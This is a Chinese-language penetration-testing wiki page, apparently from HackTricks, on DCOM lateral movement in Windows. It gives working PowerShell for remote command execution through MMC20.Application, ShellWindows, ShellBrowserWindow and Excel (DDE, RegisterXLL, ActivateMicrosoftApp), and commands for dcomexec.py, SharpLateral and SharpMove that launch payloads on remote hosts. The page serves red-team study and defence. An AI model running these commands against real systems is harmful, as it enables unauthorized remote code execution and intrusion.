# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement 很有吸引力，因为它会复用通过 RPC/DCOM 暴露的现有 COM servers，而不是创建 service 或 scheduled task。实际上，这意味着初始连接通常从 TCP/135 开始，随后转移到动态分配的高位 RPC ports。

## Prerequisites & Gotchas

- 通常需要在目标上拥有 local administrator 上下文，并且远程 COM server 必须允许远程 launch/activation。
- 自 **2023 年 3 月 14 日** 起，Microsoft 对受支持的系统强制执行 DCOM hardening。请求较低 activation authentication level 的旧客户端可能会失败，除非它们协商至少达到 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`。现代 Windows clients 通常会自动提升，因此当前 tooling 通常仍能正常工作。<sup>[[3]](#references)</sup>
- 手动或 scripted DCOM execution 通常需要 TCP/135 以及目标的 dynamic RPC port range。如果使用 Impacket 的 `dcomexec.py` 并希望获取 command output，通常还需要对 `ADMIN$`（或其他可写/可读 share）的 SMB access。
- 如果 RPC/DCOM 正常工作但 SMB 被阻止，`dcomexec.py -nooutput` 仍可用于 blind execution。

快速检查：
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

有关此 technique 的更多信息，请查看[原始 MMC20.Application 文章](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)。<sup>[[1]](#references)</sup>

分布式组件对象模型（Distributed Component Object Model，DCOM）对象为基于网络与对象进行交互提供了一项有趣的能力。Microsoft 为 DCOM 和组件对象模型（Component Object Model，COM）提供了全面的文档，分别可在 [此处查看 DCOM 文档](https://msdn.microsoft.com/en-us/library/cc226801.aspx) 和 [此处查看 COM 文档](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)。可以使用以下 PowerShell 命令检索 DCOM applications 列表：
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) 支持对 MMC snap-in 操作进行脚本化。值得注意的是，该 object 在 `Document.ActiveView` 下包含一个 `ExecuteShellCommand` method。有关此 method 的更多信息，请参阅[此处](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)。通过以下方式运行进行检查：<sup>[[6]](#references)</sup>

此功能支持通过 DCOM application over a network 执行命令。若要以 admin 身份远程与 DCOM 交互，可以使用 PowerShell，如下所示：
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
此命令连接到 DCOM application 并返回 COM object 的一个实例。随后可以调用 ExecuteShellCommand 方法，在远程主机上执行进程。该过程包括以下步骤：

检查方法：
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
获取 RCE：
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最后一个参数是窗口样式。`7` 会使窗口保持最小化状态。从实际操作来看，基于 MMC 的执行通常会导致远程 `mmc.exe` 进程生成你的 payload，这与下面由 Explorer 支持的对象有所不同。

## ShellWindows & ShellBrowserWindow

**有关此 technique 的更多信息，请查看原始文章 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

已发现 **MMC20.Application** 对象缺少显式的“LaunchPermissions”，默认使用允许 Administrators 访问的权限。有关更多细节，可以查看[此处](https://twitter.com/tiraniddo/status/817532039771525120)的讨论，并建议使用 [@tiraniddo](https://twitter.com/tiraniddo) 的 OleView .NET 来筛选没有显式 Launch Permission 的对象。

由于缺少显式 Launch Permissions，`ShellBrowserWindow` 和 `ShellWindows` 这两个特定对象受到了关注。在 `HKCR:\AppID\{guid}` 下不存在 `LaunchPermission` 注册表项，表示没有显式权限。

与 `MMC20.Application` 相比，从 OPSEC 角度来看，这些对象通常更加安静，因为命令通常会在远程主机上成为 `explorer.exe` 的子进程，而不是 `mmc.exe` 的子进程。

### ShellWindows

对于缺少 ProgID 的 `ShellWindows`，.NET 方法 `Type.GetTypeFromCLSID` 和 `Activator.CreateInstance` 可以使用其 AppID 来实例化对象。此过程利用 OleView .NET 获取 `ShellWindows` 的 CLSID。实例化后，可以通过 `WindowsShell.Item` 方法进行交互，从而调用类似 `Document.Application.ShellExecute` 的方法。

下面给出了用于实例化对象并远程执行命令的 PowerShell 示例：
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` 类似，但你可以直接通过其 CLSID 实例化它，并 pivot 到 `Document.Application.ShellExecute`：
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### 使用 Excel DCOM Objects 进行 Lateral Movement

可以通过利用 DCOM Excel Objects 实现 Lateral Movement。有关详细信息，建议阅读 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) 中关于利用 Excel DDE 通过 DCOM 进行 Lateral Movement 的讨论。<sup>[[5]](#references)</sup>

Empire 项目提供了一个 PowerShell script，通过操纵 DCOM Objects 展示如何利用 Excel 执行远程代码执行（RCE）。下面是该 script 的片段，源自 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)，展示了滥用 Excel 进行 RCE 的不同方法：
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
近期研究通过 `Excel.Application` 的 `ActivateMicrosoftApp()` 方法扩展了这一领域。其核心思路是，Excel 可以通过搜索系统 `PATH` 来尝试启动 FoxPro、Schedule Plus 或 Project 等旧版 Microsoft 应用程序。如果 operator 能够将带有这些预期名称之一的 payload 放置到目标 `PATH` 中的可写位置，Excel 就会执行它。<sup>[[4]](#references)</sup>

此变体的要求：

- 目标上的 Local admin 权限
- 目标上已安装 Excel
- 能够将 payload 写入目标 `PATH` 中的可写目录

利用 FoxPro 查找机制（`FOXPROW.exe`）的实际示例：
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
如果攻击主机未注册本地 `Excel.Application` ProgID，则改用 CLSID 实例化远程对象：
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
实际滥用中观察到的值：

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### 用于横向移动的 Automation Tools

以下两个工具被重点介绍，用于自动化这些 techniques：

- **Invoke-DCOM.ps1**：由 Empire project 提供的 PowerShell script，可简化调用不同方法在远程计算机上执行 code。此 script 可在 Empire GitHub repository 中获取。

- **SharpLateral**：用于远程执行 code 的 tool，可使用以下 command：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 自动化工具

- Powershell 脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 可轻松调用所有已注释的方式，在其他机器上执行 code。
- 你可以使用 Impacket 的 `dcomexec.py`，通过 DCOM 在远程系统上执行命令。当前版本支持 `ShellWindows`、`ShellBrowserWindow` 和 `MMC20`，默认使用 `ShellWindows`。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- 你也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- 你也可以使用 [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [使用 MMC20.Application COM Object 进行 Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [通过 DCOM 进行 Lateral Movement：第二回合](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—管理 Windows DCOM Server Security Feature Bypass (CVE-2021-26414) 的变更](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement：滥用 DCOM Excel Application 的能力](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [利用 Excel DDE 通过 DCOM 进行 Lateral Movement](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
